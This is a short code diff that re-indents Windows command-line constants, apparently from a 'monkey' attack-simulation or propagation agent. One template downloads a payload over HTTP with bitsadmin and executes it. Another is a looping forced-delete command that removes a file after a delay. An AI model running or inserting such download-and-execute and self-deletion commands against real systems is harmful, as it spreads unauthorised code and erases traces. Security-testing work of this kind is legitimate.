@@ -27,12 +27,12 @@ MONKEY_CMDLINE_DETACHED_WINDOWS = "%s start cmd /c %%(monkey_path)s %s" % (
     MONKEY_ARG,
 )
 MONKEY_CMDLINE_HTTP = (
-        '%s /c "bitsadmin /transfer Update /download /priority high %%(http_path)s %%(monkey_path)s'
-        '&cmd /c %%(monkey_path)s %s"'
-        % (
-            CMD_PREFIX,
-            MONKEY_ARG,
-        )
+    '%s /c "bitsadmin /transfer Update /download /priority high %%(http_path)s %%(monkey_path)s'
+    '&cmd /c %%(monkey_path)s %s"'
+    % (
+        CMD_PREFIX,
+        MONKEY_ARG,
+    )
 )
 DELAY_DELETE_CMD = (
     "cmd /c (for /l %%i in (1,0,2) do (ping -n 60 127.0.0.1 & del /f /q %(file_path)s & "
